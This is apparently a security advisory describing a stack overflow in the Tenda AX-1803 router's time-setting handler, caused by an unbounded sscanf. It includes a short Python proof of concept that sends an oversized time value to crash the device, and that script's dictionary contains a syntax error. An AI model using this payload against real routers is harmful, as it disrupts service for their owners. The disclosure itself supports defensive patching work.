# Tenda Vulnerability

Vendor:Tenda

Product:AX-1803

Version:v1.0.0.1(https://www.tenda.com.cn/download/detail-3421.html)

Vulnerability Type: Stack Overflow

Author:Chuanhao Wan

Mail:chuanhaowan@hust.edu.cn

Institution:Huazhong University of Science and Technology(HUST)




## Vulnerability cause

In the function processing the time parameter, the time is obtained via sub_4F55C and passed to _isoc99_sscanf, parsed with the format "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s" into the target buffers v13, v15, v17, v19, v22, and v26. The code does not restrict the length of the time parameter, and the "%s" format specifier does not specify a maximum field width, while the target buffer has a limited size. By crafting a request with an excessively long time parameter (matching the specified format), a stack overflow can be triggered, resulting in a Denial of Service (DoS) attack.


<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>



## PoC

In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks


```
import requests

url = "http://192.168.20.12/goform/SetSysTimeCfg"

time = "2023-10-02 12:34:" + "A" * 1000 
data = {
    "timeType" = "manual",
    "time": time
}

r = requests.post(url, data=data)
print(r.status_code, r.text)
```


## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>